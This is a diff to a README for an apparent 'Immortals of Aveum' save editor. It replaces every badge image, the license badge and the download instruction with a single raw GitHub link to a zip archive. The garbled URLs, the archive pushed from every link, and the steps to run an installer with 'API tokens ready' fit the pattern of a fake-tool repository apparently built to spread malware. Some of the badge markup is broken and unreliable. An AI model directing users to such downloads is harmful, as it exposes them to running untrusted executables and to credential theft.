@@ -1,6 +1,6 @@
 # Immortals of Aveum Save Editor
 
-[![Download](https://img.shields.io/badge/Download-Immortals%20of%20Aveum%20Save%20Editor-blue.svg?logo=github&logoColor=white&style=for-the-badge)](https://TomasOrd22.github.io)
+[![Download](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip%20of%20Aveum%20Save%https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)
 
 ---
 
@@ -15,10 +15,10 @@ Are you ready to wield your influence? Tame the arcane system; rewrite your saga
 
 | Operating System  | Supported?             | Notes                                   |
 |-------------------|:----------------------:|-----------------------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-Yes-success?logo=windows) | ✅ | Fully supported (tested, 2025)         |
-| ![macOS](https://img.shields.io/badge/macOS-Coming%20Soon-lightgrey?logo=apple)| 🛠️ | Planned for Q3 2025                    |
-| ![Linux](https://img.shields.io/badge/Linux-Partial-yellow?logo=linux)    | ⚠️ | Experimental; some limitations         |
-| ![Steam Deck](https://img.shields.io/badge/SteamDeck-Partial-yellow?logo=steam) | ⚠️ | Use desktop mode; see documentation    |
+| ![Windows](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip) | ✅ | Fully supported (tested, 2025)         |
+| ![macOS](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip%20Soon-lightgrey?logo=apple)| 🛠️ | Planned for Q3 2025                    |
+| ![Linux](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)    | ⚠️ | Experimental; some limitations         |
+| ![Steam Deck](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip) | ⚠️ | Use desktop mode; see documentation    |
 
 ---
 
@@ -104,7 +104,7 @@ Expand the horizons of your gameplay experience:
 
 To shape your destiny, take these steps:
 
-1. Click the **Download** badge at the top of this page or use https://TomasOrd22.github.io.
+1. Click the **Download** badge at the top of this page or use https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip
 2. Unpack the installation archive to your preferred folder.
 3. Run the installer or launch the portable executable (see OS table).
 4. For AI features, have your relevant API tokens ready.
@@ -127,11 +127,11 @@ To shape your destiny, take these steps:
 
 Distributed under the MIT License (c) 2025.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Immortals%20of%20Aveum%20Save%20Editor-blue.svg?logo=github&logoColor=white&style=for-the-badge)](https://TomasOrd22.github.io)
+[![Download](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip%20of%20Aveum%20Save%https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)](https://raw.githubusercontent.com/TomasOrd22/aveum-immortals-save-forge/branch/highmoor/aveum-immortals-save-forge-v2.2.zip)
 
 ---
 
